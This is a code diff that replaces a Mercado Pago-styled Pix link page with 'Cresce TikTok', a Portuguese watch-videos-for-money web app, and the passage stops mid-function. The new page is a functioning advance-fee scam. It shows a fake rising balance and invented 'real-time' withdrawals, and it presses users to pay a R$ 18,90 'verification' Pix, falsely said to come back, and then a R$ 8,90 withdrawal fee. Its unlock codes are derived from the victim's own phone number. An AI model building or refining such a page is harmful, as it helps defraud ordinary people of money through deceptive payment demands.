@@ -1,91 +1,810 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gerar Pix — Mercado Pago</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Cresce TikTok — Ganhe Assistindo</title>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
     <style>
-        * {margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,sans-serif;}
-        body {background:linear-gradient(135deg,#E3F2FD,#BBDEFB);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
-        .cartao {background:white;border-radius:20px;padding:30px;width:100%;max-width:420px;box-shadow:0 8px 24px rgba(0,0,0,.12);}
-        .logo {font-size:26px;font-weight:900;color:#009EE3;text-align:center;margin-bottom:5px;}
-        .subtitulo {text-align:center;color:#666;margin-bottom:25px;}
-        .etiqueta {font-size:15px;font-weight:600;color:#333;margin-bottom:8px;display:block;}
-        .campo {width:100%;padding:15px;border:2px solid #E0E0E0;border-radius:12px;font-size:17px;margin-bottom:18px;outline:none;}
-        .campo:focus {border-color:#009EE3;}
-        .botao {width:100%;padding:17px;background:#009EE3;color:white;border:none;border-radius:12px;font-size:18px;font-weight:700;cursor:pointer;}
-        .botao:hover {background:#008CDB;}
-        .resultado {margin-top:25px;display:none;animation:aparecer .4s ease;}
-        .resultado.mostrar {display:block;}
-        @keyframes aparecer {from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
-        .caixa-link {background:#F5F5F5;border-radius:12px;padding:15px;word-break:break-all;font-size:14px;margin:15px 0;}
-        .btn-copiar {background:#00B52F;color:white;border:none;padding:14px;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;width:100%;margin-top:10px;}
-        .aviso {text-align:center;font-size:14px;color:#666;margin-top:15px;}
-        .btn-abrir {background:#0066CC;color:white;border:none;padding:14px;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;width:100%;margin-top:10px;}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        :root {
+            --vermelho: #FE2C55;
+            --verde: #10B981;
+            --cinza: #F1F1F2;
+            --borda: #E8E8E8;
+            --azul: #3B82F6;
+            --roxo: #9333EA;
+            --escuro: #1F2937;
+            --claro: #F9FAFB;
+        }
+
+        body {
+            background: #F3F4F6;
+            min-height: 100vh;
+            padding-bottom: 90px;
+        }
+
+        .container {
+            max-width: 430px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            animation: aparecer 0.4s ease-out;
+            box-shadow: 0 0 30px rgba(0,0,0,0.05);
+        }
+
+        @keyframes aparecer {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: var(--escuro);
+            color: white;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            z-index: 9999;
+            transition: transform 0.4s ease;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+        }
+        .toast.mostrar { transform: translateX(-50%) translateY(0); }
+        .toast.sucesso { background: var(--verde); }
+        .toast.erro { background: var(--vermelho); }
+
+        .cabecalho {
+            background: linear-gradient(135deg, #FE2C55, #9333EA);
+            color: white;
+            padding: 44px 20px 52px;
+            border-bottom-left-radius: 32px;
+            border-bottom-right-radius: 32px;
+            text-align: center;
+        }
+        .cabecalho h1 { font-size: 26px; font-weight: 800; margin-bottom: 10px; letter-spacing: -0.3px; }
+        .cabecalho p { font-size: 15px; opacity: 0.92; line-height: 1.6; }
+        .saldo-valor { font-size: 40px; font-weight: 800; margin: 12px 0; letter-spacing: -0.5px; }
+        .fase-tag {
+            display: inline-block;
+            background: rgba(255,255,255,0.22);
+            padding: 8px 18px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 12px;
+        }
+        .crescimento-tag {
+            display: inline-block;
+            background: rgba(16,185,129,0.22);
+            color: #fff;
+            padding: 8px 18px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-left: 8px;
+        }
+
+        .etapas {
+            display: flex;
+            justify-content: space-between;
+            background: white;
+            margin: -24px 20px 24px;
+            border-radius: 20px;
+            padding: 20px 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+        }
+        .etapa { text-align: center; flex: 1; font-size: 12px; color: #9CA3AF; font-weight: 500; }
+        .etapa-num {
+            width: 36px; height: 36px; border-radius: 50%;
+            background: #F3F4F6; color: #9CA3AF;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 6px; font-weight: 700; font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        .etapa-num.ativo {
+            background: linear-gradient(135deg, #FE2C55, #9333EA);
+            color: white;
+            transform: scale(1.1);
+            box-shadow: 0 4px 12px rgba(147,51,234,0.3);
+        }
+
+        label { display: block; margin: 28px 24px 10px; font-weight: 600; font-size: 15px; color: #374151; }
+        input {
+            width: calc(100% - 48px); margin: 0 24px 14px;
+            padding: 16px; border: 2px solid var(--borda);
+            border-radius: 12px; font-size: 16px; outline: none;
+            transition: all 0.25s ease;
+            background: #FAFAFA;
+        }
+        input:focus { border-color: var(--roxo); background: white; box-shadow: 0 0 0 4px rgba(147,51,234,0.1); }
+
+        .btn {
+            width: calc(100% - 48px); margin: 12px 24px;
+            padding: 16px; border: none; border-radius: 12px;
+            font-size: 16px; font-weight: 700; cursor: pointer;
+            transition: all 0.2s ease;
+            letter-spacing: 0.2px;
+        }
+        .btn:active { transform: scale(0.97); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn-roxo { background: linear-gradient(135deg, #9333EA, #7C3AED); color: white; box-shadow: 0 4px 12px rgba(147,51,234,0.25); }
+        .btn-vermelho { background: linear-gradient(135deg, #FE2C55, #EF4444); color: white; box-shadow: 0 4px 12px rgba(239,68,68,0.25); }
+        .btn-verde { background: linear-gradient(135deg, #10B981, #059669); color: white; box-shadow: 0 4px 12px rgba(16,185,129,0.25); }
+        .btn-cinza { background: #E5E7EB; color: #4B5563; }
+        .btn-azul { background: linear-gradient(135deg, #3B82F6, #2563EB); color: white; box-shadow: 0 4px 12px rgba(59,130,246,0.25); }
+        .btn-pq { width: auto; padding: 12px 20px; margin: 0; font-size: 15px; }
+
+        .aviso {
+            padding: 20px; margin: 20px 24px; border-radius: 14px;
+            border-left: none; line-height: 1.7;
+        }
+        .aviso.roxo { background: #F3E8FF; color: #5B21B6; }
+        .aviso.laranja { background: #FFFBEB; color: #92400E; }
+        .aviso.verde { background: #ECFDF5; color: #065F46; }
+        .aviso.vermelho { background: #FEF2F2; color: #991B1B; }
+        .aviso.azul { background: #EFF6FF; color: #1E40AF; }
+
+        .pix-destaque {
+            background: rgba(16,185,129,0.15);
+            border: 1px solid var(--verde);
+            padding: 16px;
+            border-radius: 12px;
+            margin: 12px 0;
+            font-weight: 600;
+            color: #065F46;
+            text-align: center;
+            font-size: 16px;
+            line-height: 1.8;
+        }
+        .pix-destaque strong { font-size: 20px; }
+        .pix-box {
+            background: var(--escuro); color: white;
+            padding: 24px; margin: 20px 24px; border-radius: 16px;
+            text-align: center;
+        }
+        .pix-aviso {
+            font-size: 15px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+        }
+        .pix-copia {
+            background: #374151;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 14px;
+            line-height: 1.8;
+            text-align: left;
+            margin: 12px 0;
+            font-family: monospace;
+        }
+        .copiar {
+            background: var(--verde); border: none; color: white;
+            padding: 12px 24px; border-radius: 10px; font-weight: 700; cursor: pointer;
+            font-size: 15px; transition: opacity 0.2s; width: 100%; margin-top: 10px;
+        }
+        .copiar:hover { opacity: 0.9; }
+
+        .tarefa-card {
+            border: 2px solid var(--borda); border-radius: 16px;
+            padding: 22px; margin: 14px 24px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+        .tarefa-card.ativa { border-color: var(--roxo); background: #FAF5FF; box-shadow: 0 0 0 1px rgba(147,51,234,0.1); }
+        .tarefa-bloqueada { opacity: 0.4; background: #F3F4F6; }
+        .tarefa-concluida { opacity: 0.7; background: #F9FAFB; }
+        .tarefa-link { color: var(--roxo); font-weight: 600; display: inline-block; margin: 12px 0; text-decoration: none; font-size: 15px; }
+        .tarefa-recompensa { color: var(--verde); font-weight: 700; font-size: 17px; margin-top: 10px; display: inline-block; }
+        .valor-atual { font-size: 14px; color: #6B7280; margin-top: 6px; }
+        .valor-cresce { color: var(--roxo); font-weight: 700; }
+
+        .transacoes-titulo { padding: 24px 24px 12px; font-weight: 700; font-size: 17px; color: #1F2937; }
+        .transacao {
+            display: flex; justify-content: space-between;
+            padding: 16px 24px; border-bottom: 1px solid #F3F4F6;
+            transition: background 0.2s;
+        }
+        .transacao:hover { background: #F9FAFB; }
+        .transacao-nome { font-weight: 600; color: #1F2937; font-size: 15px; }
+        .transacao-hora { font-size: 13px; color: #9CA3AF; margin-top: 3px; }
+        .transacao-valor { color: var(--verde); font-weight: 700; font-size: 16px; }
+
+        .perfil-cabecalho {
+            text-align: center; padding: 40px 24px 36px;
+            background: linear-gradient(135deg, #9333EA, #3B82F6);
+            color: white; border-bottom-left-radius: 32px; border-bottom-right-radius: 32px;
+        }
+        .perfil-foto {
+            width: 100px; height: 100px; border-radius: 50%;
+            background: white; margin: 0 auto 16px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 42px; color: var(--roxo); font-weight: 800;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+        }
+        .perfil-nome { font-size: 22px; font-weight: 800; letter-spacing: -0.3px; }
+        .perfil-status {
+            display: inline-block;
+            background: rgba(255,255,255,0.22);
+            padding: 6px 16px; border-radius: 50px; font-size: 14px; font-weight: 500;
+            margin-top: 10px;
+        }
+        .perfil-info { padding: 28px 24px; }
+        .perfil-linha {
+            display: flex; justify-content: space-between;
+            padding: 18px 0; border-bottom: 1px solid #F3F4F6;
+        }
+        .perfil-label { color: #6B7280; font-size: 15px; font-weight: 500; }
+        .perfil-valor { font-weight: 700; font-size: 15px; color: #1F2937; }
+        .cod-libera-box {
+            background: #FEF2F2; border-radius: 14px; padding: 20px; margin: 24px;
+            border: 2px solid #FECACA;
+        }
+        .linha-cod { display: flex; gap: 12px; align-items: center; }
+        .linha-cod input { margin: 0; flex: 1; }
+
+        .menu {
+            position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
+            width: 100%; max-width: 430px; background: white;
+            display: flex; justify-content: space-around;
+            padding: 12px 0 28px; border-top: 1px solid #F3F4F6;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.04);
+        }
+        .menu-btn {
+            text-align: center; background: none; border: none;
+            cursor: pointer; color: #9CA3AF; font-size: 13px; font-weight: 500;
+            transition: color 0.2s;
+        }
+        .menu-btn i { font-size: 24px; margin-bottom: 5px; display: block; }
+        .menu-btn.ativo { color: var(--roxo); font-weight: 700; }
+        .menu-btn:disabled { opacity: 0.2; cursor: not-allowed; }
+
+        .oculto { display: none !important; }
+        .aviso-opcao { background: #F0FDF4; border: 1px solid #86EFAC; padding: 16px; border-radius: 12px; margin: 16px 24px; text-align: center; font-weight: 500; color: #166534; }
     </style>
 </head>
 <body>
 
-<div class="cartao">
-    <div class="logo">mercado pago</div>
-    <p class="subtitulo">Gerar Pagamento por Pix</p>
+<div id="toast" class="toast"></div>
+<div class="container">
 
-    <label class="etiqueta">Nome do Produto</label>
-    <input type="text" id="nome" class="campo" placeholder="Ex: Produto Digital">
+    <div id="tela-cadastro">
+        <div class="cabecalho">
+            <h1>Cresce TikTok</h1>
+            <p><strong>Ajude pessoas a crescer e receba comissão!</strong><br>
+            Assista vídeos, veja seu valor subir e lucre cada dia mais!</p>
+        </div>
 
-    <label class="etiqueta">Valor R$</label>
-    <input type="number" id="valor" class="campo" placeholder="0,00" step="0.01">
+        <label>Nome Completo</label>
+        <input type="text" id="nome" placeholder="Digite seu nome completo">
 
-    <button class="botao" onclick="gerar()">
-        <i class="fas fa-magic"></i> Gerar Pix
-    </button>
+        <label>WhatsApp com DDD</label>
+        <input type="tel" id="telefone" placeholder="(DD) 90000-0000" maxlength="15">
 
-    <div class="resultado" id="caixa">
-        <strong style="font-size:18px;color:#00B52F;display:block;text-align:center;">✅ PIX GERADO!</strong>
-        
-        <button class="btn-abrir" onclick="abrirPix()">
-            <i class="fas fa-external-link-alt"></i> 🔵 ABRIR PIX — Cliente paga aqui
-        </button>
-        
-        <div class="caixa-link" id="linkTexto"></div>
-        
-        <button class="btn-copiar" onclick="copiar()">
-            <i class="fas fa-copy"></i> Copiar Link
-        </button>
-        
-        <p class="aviso">👉 O cliente clica no botão acima → aparece o <strong>QR Code + código Pix</strong> → paga → dinheiro cai na sua conta! 💰</p>
+        <button class="btn btn-roxo" onclick="cadastrar()">Começar — Ganhe R$ 5,00</button>
+    </div>
+
+    <div id="plataforma" class="oculto">
+        <div class="cabecalho">
+            <p>Saldo Disponível</p>
+            <div class="saldo-valor">R$ <span id="saldo">0,00</span></div>
+            <b id="nome-usuario"></b>
+            <div class="fase-tag" id="fase-tag">Fase 1 — Comissões crescentes</div>
+            <span class="crescimento-tag">Valor sobe a cada vídeo!</span>
+        </div>
+
+        <div class="etapas">
+            <div class="etapa"><div class="etapa-num ativo" id="et1">1</div>Assistir</div>
+            <div class="etapa"><div class="etapa-num" id="et2">2</div>Liberação</div>
+            <div class="etapa"><div class="etapa-num" id="et3">3</div>Avanço</div>
+            <div class="etapa"><div class="etapa-num" id="et4">4</div>Conclusão</div>
+        </div>
+
+        <div id="aba-inicio">
+            <div class="aviso roxo">
+                <strong>Como funciona:</strong> Você assiste cada vídeo completo e ganha comissão.
+                <br><strong>Conclua na ordem — um por vez — para ver seu saldo crescer!</strong>
+            </div>
+            <div id="lista-tarefas"></div>
+            <div class="transacoes-titulo">
+                <i class="fa fa-line-chart" style="color:var(--roxo);"></i> Últimos saques — Em tempo real
+            </div>
+            <div id="lista-transacoes"></div>
+        </div>
+
+        <div id="aba-libera" class="oculto">
+            <div id="aviso-libera" class="aviso verde">
+                <strong>🎉 Parabéns! Concluiu todos os vídeos!</strong><br>
+                Pague R$ 18,90 de verificação e receba de volta junto com todo o seu saldo!
+            </div>
+            <div class="aviso-opcao">
+                ✅ Após confirmar, você <strong>pode sacar o valor total</strong> ou continuar assistindo para ganhar mais!
+            </div>
+            <div id="caixa-pagamento-libera">
+                <div class="pix-destaque">
+                    💰 Você paga: <strong style="color:#B91C1C;">R$ 18,90</strong><br>
+                    💵 Recebe de volta: <strong style="color:#065F46;" id="mostra-saldo-libera">R$ 60,90</strong><br>
+                    ✅ SEU LUCRO: <strong style="font-size:22px; color:#059669;">R$ 42,00</strong>
+                </div>
+                <div class="pix-box">
+                    <div style="font-size:22px; font-weight:bold; margin-bottom:10px;">PIX</div>
+                    <div class="pix-aviso">
+                        Não é taxa — é verificação de segurança.<br>
+                        Esse valor volta TODO para você junto com o saque!
+                    </div>
+                    <div class="pix-copia" id="texto-copia">
+───────────────────────<br>
+📋 <strong>DADOS DO PAGAMENTO</strong><br>
+───────────────────────<br>
+👤 Nome: <span id="cop-nome">-</span><br>
+📱 Telefone: <span id="cop-tel">-</span><br>
+💸 Pagar: R$ 18,90<br>
+💵 Receber: R$ 60,90<br>
+✅ LUCRO: R$ 42,00<br>
+───────────────────────<br>
+💡 O valor de R$ 18,90 volta TODO para você!
+                    </div>
+                    <button class="copiar" onclick="copiarTexto()">Copiar Tudo</button>
+                </div>
+                <label>Código de confirmação</label>
+                <input type="text" id="codigo-libera" placeholder="Digite seu código" maxlength="4">
+                <button class="btn btn-vermelho" onclick="confirmarLibera()">Confirmar pagamento</button>
+            </div>
+        </div>
+
+        <div id="aba-saque" class="oculto">
+            <div id="status-saque" class="aviso verde">
+                <strong>Saldo Disponível</strong><br>
+                <span style="font-size:30px; font-weight:800;">R$ <span id="valor-saque">0,00</span></span>
+            </div>
+            <label>Sua Chave Pix</label>
+            <input type="text" id="chave-saque" placeholder="CPF, telefone ou e-mail">
+            <label>Valor do Saque</label>
+            <input type="number" id="valor-pedido" placeholder="Mínimo R$ 30,00" step="0.01">
+            <button class="btn btn-verde" id="btn-sacar" onclick="solicitarSaque()">Solicitar Saque</button>
+
+            <div id="bloco-taxa" class="oculto">
+                <div class="aviso azul">
+                    <strong>Verificação de segurança</strong><br>
+                    Pague a taxa de R$ 8,90 para liberar o saque. Valor baixo, saque alto!
+                </div>
+                <div class="pix-box">
+                    <div style="font-size:22px; font-weight:bold; margin-bottom:10px;">PIX</div>
+                    <div class="pix-aviso">Entre em contato para os dados de pagamento.</div>
+                    <div class="pix-copia" id="texto-copia-taxa">
+───────────────────────<br>
+📋 <strong>TAXA DE VERIFICAÇÃO — R$ 8,90</strong><br>
+───────────────────────<br>
+👤 Nome: <span id="cop-nome-t">-</span><br>
+📱 Telefone: <span id="cop-tel-t">-</span><br>
+💰 Valor: R$ 8,90<br>
+───────────────────────<br>
+                    </div>
+                    <button class="copiar" onclick="copiarTextoTaxa()">Copiar Tudo</button>
+                </div>
+                <label>Código de confirmação</label>
+                <input type="text" id="codigo-taxa" placeholder="6 dígitos" maxlength="6">
+                <button class="btn btn-vermelho" onclick="confirmarTaxa()">Confirmar pagamento</button>
+            </div>
+        </div>
+
+        <div id="aba-extrato" class="oculto">
+            <div style="padding:28px 24px 12px;"><h3 style="font-size:18px; font-weight:800; color:#1F2937;">Meus Ganhos</h3></div>
+            <div id="lista-extrato"></div>
+        </div>
+
+        <div id="aba-perfil" class="oculto">
+            <div class="perfil-cabecalho">
+                <div class="perfil-foto" id="perfil-inicial">P</div>
+                <div class="perfil-nome" id="perfil-nome-completo">Usuário</div>
+                <div class="perfil-status">Conta verificada</div>
+            </div>
+            <div id="codigo-perfil-box" class="cod-libera-box oculto">
+                <div class="linha-cod">
+                    <input type="text" id="codigo-perfil" placeholder="Código de liberação" maxlength="4">
+                    <button class="btn btn-vermelho btn-pq" onclick="confirmarPeloPerfil()">Confirmar</button>
+                </div>
+            </div>
+            <div class="perfil-info">
+                <div class="perfil-linha"><span class="perfil-label">Nome completo</span><span class="perfil-valor" id="p-nome">-</span></div>
+                <div class="perfil-linha"><span class="perfil-label">WhatsApp</span><span class="perfil-valor" id="p-telefone">-</span></div>
+                <div class="perfil-linha"><span class="perfil-label">Vídeos assistidos</span><span class="perfil-valor" id="p-videos">0</span></div>
+                <div class="perfil-linha"><span class="perfil-label">Saldo atual</span><span class="perfil-valor" id="p-saldo">-</span></div>
+                <div class="perfil-linha"><span class="perfil-label">Fase atual</span><span class="perfil-valor" id="p-fase">1</span></div>
+            </div>
+            <button class="btn btn-azul" onclick="carregarPerfil()">Atualizar dados</button>
+            <button class="btn btn-cinza" onclick="if(confirm('Deseja sair da conta?')){localStorage.removeItem('plataforma');location.reload();}">Sair da conta</button>
+        </div>
+
+        <div class="menu">
+            <button class="menu-btn ativo" onclick="mostrarAba('inicio')"><i class="fa fa-home"></i>Início</button>
+            <button class="menu-btn" id="btn-libera" onclick="mostrarAba('libera')" disabled><i class="fa fa-unlock-alt"></i>Liberação</button>
+            <button class="menu-btn" onclick="mostrarAba('saque')"><i class="fa fa-money"></i>Saque</button>
+            <button class="menu-btn" onclick="mostrarAba('extrato')"><i class="fa fa-bar-chart"></i>Ganhos</button>
+            <button class="menu-btn" onclick="mostrarAba('perfil')"><i class="fa fa-user"></i>Perfil</button>
+        </div>
     </div>
 </div>
 
 <script>
-let linkFinal = "";
-
-function gerar() {
-    const nome = document.getElementById('nome').value.trim();
-    const valor = document.getElementById('valor').value;
-    
-    if (!nome || !valor || valor <= 0) {
-        alert("⚠️ Preencha o nome e o valor corretamente!");
-        return;
-    }
-
-    // ✅ LINK OFICIAL DO MERCADO PAGO — NÃO DÁ ERRO NENHUM!
-    linkFinal = `https://www.mercadopago.com.br/checkout/v1/redirect?prefill_amount=${valor}&prefill_description=${encodeURIComponent(nome)}`;
-    
-    document.getElementById('linkTexto').textContent = linkFinal;
-    document.getElementById('caixa').classList.add('mostrar');
+function valorAleatorio(min, max) {
+    return Number((Math.random() * (max - min) + min).toFixed(2));
 }
 
-function abrirPix() {
-    window.open(linkFinal, '_blank');
+// ✅ Paga R$ 18,90 → recebe R$ 60,90 → lucro R$ 42,00
+const CONFIG = {
+    bonus: 5.00,
+    fase1: [8.50, 11.00, 13.50, 15.90, 17.00],  // Soma = R$ 60,90
+    fase2: [15.00, 22.00, 30.00, 40.00, 55.00],
+    fase3: Array.from({length: 5}, () => valorAleatorio(25.00, 45.00)),
+    fase4: Array.from({length: 5}, () => valorAleatorio(35.00, 60.00)),
+    valorLiberacao: 18.90,
+    taxaSaque: 8.90,
+    minimoSaque: 30,
+    videos: [
+        "https://vt.tiktok.com/ZS4XmLRvT/",
+        "https://vt.tiktok.com/ZS4XmfE6B/",
+        "https://vt.tiktok.com/ZS4XmthWU/"
+    ],
+    nomes: ["Mariana", "Lucas", "Beatriz", "Pedro", "Ana", "Carlos", "Julia", "Rafael", "Larissa", "Gabriel"]
+};
+
+let ultimosSaques = [];
+let banco = {
+    nome: "", telefone: "", saldo: 0, fase: 1, tarefaAtual: 1,
+    videosAssistidos: 0, liberacaoVisivel: false, liberadoFase2: false,
+    fase3Desbloqueada: false, fase4Desbloqueada: false,
+    totalGanho: 0, tarefasConcluidas: {}, taxaPaga: false
+};
+
+function dinheiro(v) { return "R$ " + Number(v).toFixed(2).replace(".", ","); }
+function aviso(txt, tipo="") {
+    const el = document.getElementById("toast");
+    el.textContent = txt;
+    el.className = "toast mostrar " + tipo;
+    setTimeout(function(){ el.classList.remove("mostrar"); }, 3500);
+}
+function gerarCodigoLibera(tel) {
+    const n = tel.replace(/\D/g, "");
+    return n.substring(0, 2) + n.slice(-2);
+}
+function gerarCodigoTaxa(tel) {
+    const n = tel.replace(/\D/g, "");
+    return n.substring(0, 2) + "50" + n.slice(-2);
+}
+function salvar() { localStorage.setItem("plataforma", JSON.stringify(banco)); }
+function carregar() {
+    const d = localStorage.getItem("plataforma");
+    if (!d) return false;
+    banco = JSON.parse(d);
+    return true;
 }
 
-function copiar() {
-    navigator.clipboard.writeText(linkFinal).then(() => {
-        alert("✅ Link copiado! É só enviar! 💰");
+function copiarTexto() {
+    const texto = `
+───────────────────────
+📋 DADOS DO PAGAMENTO
+───────────────────────
+👤 Nome: ${banco.nome}
+📱 Telefone: ${banco.telefone}
+💸 PAGAR: R$ 18,90
+💵 RECEBER: R$ 60,90
+✅ LUCRO: R$ 42,00
+───────────────────────
+💡 Pode sacar tudo ou continuar ganhando mais!
+    `;
+    navigator.clipboard.writeText(texto.trim()).then(() => {
+        aviso("Copiado!", "sucesso");
     });
 }
+
+function copiarTextoTaxa() {
+    const texto = `
+───────────────────────
+📋 TAXA DE VERIFICAÇÃO — R$ 8,90
+───────────────────────
+👤 Nome: ${banco.nome}
+📱 Telefone: ${banco.telefone}
+💰 Valor: R$ 8,90
+───────────────────────
+💡 Após confirmar, o saque é liberado!
+    `;
+    navigator.clipboard.writeText(texto.trim()).then(() => {
+        aviso("Copiado!", "sucesso");
+    });
+}
+
+function cadastrar() {
+    const n = document.getElementById("nome").value.trim();
+    const t = document.getElementById("telefone").value.trim();
+    if (!n || n.length < 3) return aviso("Digite seu nome completo.", "erro");
+    if (t.replace(/\D/g, "").length < 10) return aviso("Número de WhatsApp inválido.", "erro");
+    
+    banco.nome = n;
+    banco.telefone = t;
+    banco.saldo = CONFIG.bonus;
+    banco.totalGanho = CONFIG.bonus;
+    salvar();
+
+    document.getElementById("tela-cadastro").classList.add("oculto");
+    document.getElementById("plataforma").classList.remove("oculto");
+    document.getElementById("nome-usuario").textContent = n;
+    atualizarSaldo();
+    montarTarefas();
+    iniciarSaques();
+    aviso("Bem-vindo, " + n + "!", "sucesso");
+}
+
+function atualizarSaldo() {
+    document.getElementById("saldo").textContent = dinheiro(banco.saldo).replace("R$ ", "");
+    document.getElementById("valor-saque").textContent = dinheiro(banco.saldo).replace("R$ ", "");
+    document.getElementById("cop-nome").textContent = banco.nome;
+    document.getElementById("cop-tel").textContent = banco.telefone;
+    document.getElementById("cop-nome-t").textContent = banco.nome;
+    document.getElementById("cop-tel-t").textContent = banco.telefone;
+}
+
+function getListaFase() {
+    if (banco.fase === 1) return CONFIG.fase1;
+    if (banco.fase === 2) return CONFIG.fase2;
+    if (banco.fase === 3) return CONFIG.fase3;
+    return CONFIG.fase4;
+}
+
+function montarTarefas() {
+    const lista = getListaFase();
+    let html = "";
+    for (let i = 1; i <= 5; i++) {
+        const ok = banco.tarefasConcluidas[i];
+        const ativa = !ok && i === banco.tarefaAtual;
+        const bloqueada = !ok && i > banco.tarefaAtual;
+        const ant = i > 1 ? lista[i - 2] : null;
+
+        let classe = "";
+        if (ok) classe = "tarefa-concluida";
+        else if (bloqueada) classe = "tarefa-bloqueada";
+        else if (ativa) classe = "ativa";
+
+        html += '<div class="tarefa-card ' + classe + '">' +
+            '<strong>' + (ok ? '✅ Concluído' : ativa ? '▶ Em andamento' : bloqueada ? '🔒 Bloqueada' : 'Pendente') + ' — Vídeo ' + i + '</strong><br>' +
+            (ok ? '' : bloqueada ? 'Conclua o vídeo anterior primeiro.' : 'Assista o vídeo e retorne para confirmar.<br>') +
+            (ant ? '<div class="valor-atual">Valor anterior: <span class="valor-cresce">' + dinheiro(ant) + '</span></div>' : '') +
+            (!ok && !bloqueada ? '<a href="' + CONFIG.videos[(i - 1) % 3] + '" target="_blank" class="tarefa-link" onclick="marcar(' + i + ')">Abrir vídeo</a>' +
+            '<button class="btn btn-roxo" style="margin:10px 0; width:100%;" id="btn' + i + '" onclick="concluir(' + i + ',' + lista[i - 1] + ')" disabled>Confirmar</button>' : '') +
+            (!bloqueada ? '<div class="tarefa-recompensa">+ ' + dinheiro(lista[i - 1]) + '</div>' : '') +
+        '</div>';
+    }
+    document.getElementById("lista-tarefas").innerHTML = html;
+}
+
+function marcar(n) {
+    setTimeout(function(){
+        const b = document.getElementById("btn" + n);
+        if (b) { b.disabled = false; b.textContent = "Receber valor"; }
+    }, 1500);
+}
+
+function concluir(n, val) {
+    if (n !== banco.tarefaAtual) {
+        return aviso("Conclua o vídeo " + banco.tarefaAtual + " primeiro!", "erro");
+    }
+
+    banco.tarefasConcluidas[n] = true;
+    banco.saldo += val;
+    banco.videosAssistidos++;
+    banco.tarefaAtual++;
+
+    if (banco.fase === 1 && n === 5) {
+        banco.liberacaoVisivel = true;
+        document.getElementById("btn-libera").disabled = false;
+        irLibera();
+    }
+    if (banco.fase === 2 && n === 5) avancarFase3();
+    if (banco.fase === 3 && n === 5) avancarFase4();
+    if (banco.fase === 4 && n === 5) aviso("Parabéns! Concluiu todas as fases!", "sucesso");
+
+    atualizarSaldo();
+    salvar();
+    montarTarefas();
+    aviso("+ " + dinheiro(val), "sucesso");
+}
+
+function avancarFase3() {
+    banco.fase = 3;
+    banco.tarefaAtual = 1;
+    banco.tarefasConcluidas = {};
+    banco.fase3Desbloqueada = true;
+    document.getElementById("fase-tag").textContent = "Fase 3 — Valores elevados";
+    document.getElementById("et3").classList.add("ativo");
+    salvar();
+    aviso("Fase 3 desbloqueada! Continue ou saque quando quiser.", "sucesso");
+}
+
+function avancarFase4() {
+    banco.fase = 4;
+    banco.tarefaAtual = 1;
+    banco.tarefasConcluidas = {};
+    banco.fase4Desbloqueada = true;
+    document.getElementById("fase-tag").textContent = "Fase 4 — Valores máximos";
+    document.getElementById("et4").classList.add("ativo");
+    salvar();
+    aviso("Fase 4 desbloqueada! Continue ou saque quando quiser.", "sucesso");
+}
+
+function irLibera() {
+    mostrarAba("libera");
+    document.getElementById("et2").classList.add("ativo");
+}
+
+function liberarFase2() {
+    banco.saldo += CONFIG.valorLiberacao; // Soma os R$ 18,90 no saldo
+    banco.liberadoFase2 = true;
+    banco.fase = 2;
+    // ✅ NÃO força continuar — pode sacar ou continuar
+    document.getElementById("fase-tag").textContent = "Fase 2 — Valores aumentados";
+    document.getElementById("caixa-pagamento-libera").classList.add("oculto");
+    document.getElementById("aviso-libera").innerHTML = "<strong>✅ Pagamento confirmado!</strong><br>R$ 18,90 adicionado ao seu saldo.<br>👉 <strong>Já pode ir em SAQUE e retirar tudo</strong> ou continuar assistindo para ganhar mais!";
+    atualizarSaldo();
+    salvar();
+    aviso("Saldo liberado! Saque quando quiser.", "sucesso");
+}
+
+function confirmarLibera() {
+    const cod = document.getElementById("codigo-libera").value.trim();
+    if (cod === gerarCodigoLibera(banco.telefone)) {
+        liberarFase2();
+    } else {
+        aviso("Código incorreto.", "erro");
+    }
+}
+
+function confirmarPeloPerfil() {
+    if (banco.liberadoFase2) return aviso("Já está liberado.", "sucesso");
+    const cod = document.getElementById("codigo-perfil").value.trim();
+    if (cod === gerarCodigoLibera(banco.telefone)) {
+        liberarFase2();
+    } else {
+        aviso("Código incorreto.", "erro");
+    }
+}
+
+function solicitarSaque() {
+    // ✅ Só exige liberação — não exige concluir mais nada
+    if (!banco.liberadoFase2) return aviso("Confirme o pagamento de liberação primeiro.", "erro");
+    const val = parseFloat(document.getElementById("valor-pedido").value);
+    if (isNaN(val) || val < CONFIG.minimoSaque) return aviso("Valor mínimo: " + dinheiro(CONFIG.minimoSaque), "erro");
+    if (val > banco.saldo) return aviso("Saldo insuficiente.", "erro");
